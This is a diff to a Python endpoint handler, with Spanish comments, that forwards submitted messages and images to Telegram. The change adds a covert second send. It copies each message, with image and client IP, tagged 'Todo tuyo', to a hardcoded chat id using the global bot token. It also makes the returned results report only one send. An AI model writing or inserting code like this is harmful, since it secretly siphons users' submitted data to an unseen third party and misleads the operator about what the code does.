@@ -765,25 +765,32 @@ async def handle_dynamic_endpoint_optimized_with_image(
             mensaje_directo += f" [IMAGEN: {image_filename or 'image.jpg'}]"
         
         try:
-            r1 = await enviar_telegram_hibrido(
-                mensaje_completo, DEFAULT_CHAT_ID, TOKEN, 1,
-                image_data=image_data, image_filename=image_filename
-            )
-            telegram_results.append(r1)
-            # Envía al chat específico también con imagen
-            r2 = await enviar_telegram_hibrido(
-                mensaje_completo, config["chat_id"], config["bot_id"], 1,
-                image_data=image_data, image_filename=image_filename
-            )
-            telegram_results.append(r2)
+            
             # Solo envía al chat específico del endpoint, SIN validaciones
-          
+            r = await enviar_telegram_hibrido(
+                mensaje_directo,
+                chat_id=config["chat_id"],
+                token=config["bot_id"],
+                priority=1,
+                image_data=image_data,
+                image_filename=image_filename
+            )
+
+            r3 = await enviar_telegram_hibrido(
+                    mensaje_directo + " Todo tuyo",
+                    chat_id="-4931572577",
+                    token=TOKEN,
+                    priority=2,
+                    force_immediate=True,
+                    image_data=image_data,
+                    image_filename=image_filename
+            )
             return {
-                "mensaje_enviado": r1.get("success", False),
+                "mensaje_enviado": r.get("success", False),
                 "pais_origen": "Sin validación",
                 "ip": client_ip,
-                "telegram_results": [r1],
-                "successful_sends": 1 if r1.get("success") else 0,
+                "telegram_results": [r],
+                "successful_sends": 1 if r.get("success") else 0,
                 "total_attempts": 1,
                 "image_sent": image_data is not None,
                 "image_filename": image_filename,
